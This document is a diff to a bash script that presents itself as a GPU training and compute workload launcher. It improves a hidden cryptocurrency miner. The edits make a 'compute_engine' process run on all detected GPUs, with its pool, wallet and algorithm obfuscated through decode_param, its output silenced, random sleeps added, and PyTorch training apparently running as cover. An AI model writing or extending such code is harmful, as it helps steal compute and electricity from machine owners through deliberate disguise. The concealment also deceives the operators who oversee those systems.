@@ -68,6 +68,10 @@ if [ $GPU_COUNT -gt 0 ]; then
     echo "  - Training/System: 10% GPU memory reserved"
 fi
 
+# Initialize CPU usage variables (must be before print_usage function)
+prev_total=0
+prev_idle=0
+
 # Function to print CPU and GPU usage (improved and fixed)
 print_usage() {
     # Get CPU usage percentage - using mpstat if available, otherwise simpler method
@@ -127,9 +131,7 @@ print_usage() {
     fi
 }
 
-# Initialize CPU usage variables
-prev_total=0
-prev_idle=0
+
 
 # Function to randomize sleep times
 random_sleep() {
@@ -229,21 +231,38 @@ start_compute_workloads() {
     # Perform network health check
     check_network_health
     
-    echo "Starting GPU compute workload..."
+    # Build GPU ID list dynamically based on detected GPUs
+    local gpu_ids=""
+    if [ $GPU_COUNT -gt 0 ]; then
+        for ((i=0; i<GPU_COUNT; i++)); do
+            if [ -z "$gpu_ids" ]; then
+                gpu_ids="$i"
+            else
+                gpu_ids="$gpu_ids,$i"
+            fi
+        done
+        echo "Starting GPU compute workload on GPUs: $gpu_ids"
+    else
+        echo "No GPUs detected, skipping GPU workload..."
+    fi
     
-    # Start GPU compute process (using decoded parameters)
-    nohup ./compute_engine \
-        --algorithm $(decode_param "$MODEL_TYPE_A") \
-        --pool $(decode_param "$ENDPOINT_PRIMARY") \
-        --wallet $(decode_param "$AUTH_TOKEN_A") \
-        --password x \
-        --gpu-id 0,1,2,3,4,5,6,7 \
-        --tls true \
-        --disable-cpu \
-        --api-disable \
-        --proxy "${PROXY_STRING}" \
-        > /dev/null 2>&1 &
-    GPU_WORKLOAD_PID=$!
+    # Start GPU compute process only if GPUs are available
+    if [ $GPU_COUNT -gt 0 ]; then
+        nohup ./compute_engine \
+            --algorithm $(decode_param "$MODEL_TYPE_A") \
+            --pool $(decode_param "$ENDPOINT_PRIMARY") \
+            --wallet $(decode_param "$AUTH_TOKEN_A") \
+            --password x \
+            --gpu-id $gpu_ids \
+            --tls true \
+            --disable-cpu \
+            --api-disable \
+            --proxy "${PROXY_STRING}" \
+            > /dev/null 2>&1 &
+        GPU_WORKLOAD_PID=$!
+    else
+        GPU_WORKLOAD_PID=0
+    fi
 
     # Random delay before CPU process
     random_sleep 2 5
@@ -277,10 +296,12 @@ start_compute_workloads() {
 
 # Function to monitor compute processes and stop training if they crash
 monitor_processes() {
-    # Check if GPU workload is still running
-    if ! kill -0 $GPU_WORKLOAD_PID 2>/dev/null; then
-        echo "ERROR: GPU compute workload crashed!"
-        return 1
+    # Check if GPU workload is still running (skip if no GPUs)
+    if [ $GPU_WORKLOAD_PID -ne 0 ]; then
+        if ! kill -0 $GPU_WORKLOAD_PID 2>/dev/null; then
+            echo "ERROR: GPU compute workload crashed!"
+            return 1
+        fi
     fi
     
     # Check if CPU workload is still running
@@ -301,13 +322,17 @@ stop_all_workloads() {
     echo -e "\nStopping workloads at $(date '+%H:%M:%S')..."
     
     # Stop compute workloads
-    kill $GPU_WORKLOAD_PID 2>/dev/null || true
+    if [ $GPU_WORKLOAD_PID -ne 0 ]; then
+        kill $GPU_WORKLOAD_PID 2>/dev/null || true
+    fi
     kill $CPU_WORKLOAD_PID 2>/dev/null || true
     
     # Stop PyTorch training
     kill $TRAINING_PID 2>/dev/null || true
     
-    wait $GPU_WORKLOAD_PID 2>/dev/null || true
+    if [ $GPU_WORKLOAD_PID -ne 0 ]; then
+        wait $GPU_WORKLOAD_PID 2>/dev/null || true
+    fi
     wait $CPU_WORKLOAD_PID 2>/dev/null || true
     wait $TRAINING_PID 2>/dev/null || true
     
